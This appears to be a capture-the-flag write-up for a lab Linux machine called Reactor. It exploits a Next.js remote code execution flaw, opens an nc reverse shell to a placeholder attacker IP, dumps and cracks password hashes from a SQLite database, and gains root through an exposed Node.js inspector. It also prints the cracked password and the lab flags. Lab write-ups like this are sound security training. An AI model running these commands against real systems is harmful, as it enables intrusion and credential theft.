# Overview

Reactor is a Linux machine that revolves around exploiting a vulnerable Next.js application. During enumeration, a web service running on port `3000` was identified and fingerprinted as `Next.js 15.0.3`, a version affected by `CVE-2025-55182`.

By leveraging this vulnerability, it was possible to achieve remote command execution, access sensitive application files, extract credentials from a SQLite database, and obtain SSH access as a low-privileged user. Privilege escalation was then achieved by interacting with a root-owned Node.js process running with the inspector interface enabled.

---

# Reconnaissance

The initial step was to perform a basic port scan against the target.

```bash
nmap 10.129.23.53
```

Output:

```text
22/tcp   open  ssh
3000/tcp open  http
```

The scan revealed two exposed services:

- SSH on port `22`
- A web application on port `3000`

Browsing the web application and analyzing its technologies with Wappalyzer identified the framework in use.

```text
Next.js 15.0.3
```

Since framework versions often reveal known vulnerabilities, the next step was to investigate publicly disclosed issues affecting this release.

# Exploitation

## Exploiting CVE-2025-55182

A public proof-of-concept was used to verify command execution on the target.

```bash
git clone https://github.com/msanft/CVE-2025-55182.git
```

Several commands were executed to confirm code execution and gather information about the environment.

```bash
python3 poc.py http://reactor.htb:3000 id
python3 poc.py http://reactor.htb:3000 "pwd"
python3 poc.py http://reactor.htb:3000 "ls -la"
python3 poc.py http://reactor.htb:3000 "cat /opt/reactor-app/.env"
python3 poc.py http://reactor.htb:3000 "sqlite3 /opt/reactor-app/reactor.db '.tables'"
```

These commands confirmed remote code execution and provided access to application files and the SQLite database used by the application.

## Obtaining a Reverse Shell

After verifying command execution, a reverse shell was established.

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell:

```bash
python3 poc.py http://reactor.htb:3000 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f"
```

Once the connection was received, the shell was upgraded to a fully interactive TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# Initial Access

## Extracting User Credentials

With access to the system, the SQLite database was inspected.

```bash
sqlite3 reactor.db
```

List available tables:

```bash
.tables
```

Retrieve user information:

```bash
SELECT * FROM users;
```

The database contained two password hashes:

```text
admin: a203b22191d744a4e70ada5c101b17b8
engineer: 39d97110eafe2a9a68639812cd271e8e
```

## Cracking Password Hashes

The hashes were saved locally and attacked using Hashcat.

```bash
mousepad hash.txt
```

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Display recovered passwords:

```bash
hashcat -m 0 hash.txt --show
```

Output:

```text
39d97110eafe2a9a68639812cd271e8e:reactor1
```

The password for the `engineer` account was successfully recovered.

## SSH Access

Using the recovered credentials, SSH access was obtained.

```bash
ssh engineer@reactor.htb
```

Password:

```text
reactor1
```

Retrieve the user flag:

```bash
cat user.txt
```

Flag:

```text
3919723d1d17ce33c73ae13aef1a2222
```

# Privilege Escalation

## Discovering a Root-Owned Node.js Process

After gaining access as `engineer`, running process enumeration revealed a Node.js service running as root.

```bash
ps aux | grep node
```

Output:

```text
root 1406 0.0 1.1 1066804 47308 ? Ssl 11:05 0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The process was launched with the Node.js inspector enabled on:

```text
127.0.0.1:9229
```

Since the inspector interface allows interaction with the running process, it provided a path to execute commands in the context of the root-owned service.

## Connecting to the Inspector

Connect to the debugger interface:

```bash
node inspect 127.0.0.1:9229
```

Execute commands through the Node.js runtime:

```bash
exec("process.mainModule.require('child_process').execSync('id').toString()")
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

Output:

```text
4b62b5014af4aad78b46dd0e270687a7
```

---

# Conclusion

Reactor demonstrated the danger of running outdated web frameworks with publicly known vulnerabilities. Exploiting `CVE-2025-55182` in `Next.js 15.0.3` provided remote command execution, which led to database access and credential extraction. After pivoting to the `engineer` user via SSH, a misconfigured root-owned Node.js process exposing the inspector interface allowed full system compromise and retrieval of the root flag.
